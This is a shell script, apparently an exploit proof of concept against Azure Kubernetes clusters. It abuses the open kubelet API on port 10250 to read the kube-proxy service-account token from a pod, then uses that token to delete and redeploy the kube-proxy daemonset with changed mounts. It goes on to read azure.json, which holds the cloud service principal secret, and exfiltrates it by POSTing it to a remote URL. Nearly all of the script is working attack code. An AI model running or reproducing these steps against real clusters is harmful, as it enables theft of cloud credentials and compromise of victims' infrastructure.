#!/bin/sh
set -x
## by default service account are mounted on pods, to use that uncomment line below
# cat /run/secrets/kubernetes.io/serviceaccount/token > token.txt
# Gets node IP using Azure metadata API
nodeip=$(curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2017-08-01" | jq .network.interface[].ipv4.ipAddress[].privateIpAddress | sed 's/"//g')
# Gets kube-proxy instance name for current given node
proxyname=$(curl -sk https://$nodeip:10250/runningpods/ | jq '.items[].metadata.name' | grep kube-proxy | sed 's/"//g')
# Fetch token information
curl --connect-timeout 5 -sk https://$nodeip:10250/run/kube-system/$proxyname/kube-proxy/ -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token" -o token.txt
# Export yaml for current kube-proxy
kubectl get ds/kube-proxy --namespace kube-system -o yaml --export --server='https://10.0.0.1:443' --token=$(cat token.txt) --insecure-skip-tls-verify=true > kube-proxy-spec.yaml
# Delete kube-proxy from system
kubectl delete --namespace kube-system --server='https://10.0.0.1:443' --token=$(cat token.txt) --insecure-skip-tls-verify=true -f kube-proxy-spec.yaml
# Add kube-proxy after amending mounts
cat kube-proxy-spec.yaml | sed -E 's/kubernetes\/certs/kubernetes/g' | kubectl apply --namespace kube-system --server='https://10.0.0.1:443' --token=$(cat token.txt) --insecure-skip-tls-verify=true -f -
# Get name for new proxy-dns
proxyname=$(curl -sk https://$nodeip:10250/runningpods/ | jq '.items[].metadata.name' | grep kube-proxy | sed 's/"//g')
## Fetch azure.json file which contains service principal/secret
curl --connect-timeout 5 -sk https://$nodeip:10250/run/kube-system/$proxyname/kube-proxy/ -d "cmd=cat /etc/kubernetes/azure.json" -o azure.json
## [OPTIONAL] Echoes Azure Service Principal details
echo 'Azure SPN: ' $(cat azure.json | jq '. | {s:.subscriptionId, c:.aadClientId, p:.aadClientSecret, t: .tenantId}')
## Send service principal credentials to remote URL
curl --connect-timeout 5 -X POST -H "Content-Type: application/json" -d "$(cat azure.json)" $TARGET_POST_URL
